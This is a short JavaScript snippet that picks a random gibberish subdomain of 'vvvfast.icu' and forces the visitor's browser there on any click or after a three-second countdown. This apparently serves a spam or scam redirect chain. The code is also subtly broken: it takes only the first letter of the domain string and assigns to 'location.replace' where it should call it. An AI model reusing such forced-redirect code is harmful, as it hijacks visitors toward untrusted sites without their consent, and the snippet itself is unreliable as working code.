var domain = ["pug3p75bepxx", "fupnejkzd8zb", "duxxuluky38u","aqvf6xrenxec","2awcvaerjwkd"];
var topLevelDomains = "vvvfast.icu";
var randomIndex = Math.floor(Math.random() * domain.length);
var selectedDomain = domain[randomIndex];
var targetURL = "https://" + selectedDomain + "." + topLevelDomains[0];

document.addEventListener("click", function() {
  window.location.replace = targetURL;
});

window.onload = function() {
  var count = 3;
  var textElement = document.getElementById('countdown');
  var countdown = setInterval(function() {
      textElement.textContent = count;
      count--;
      if (count < 0) {
          clearInterval(countdown);
          window.location.replace = targetURL;
      }
  }, 1000);
};
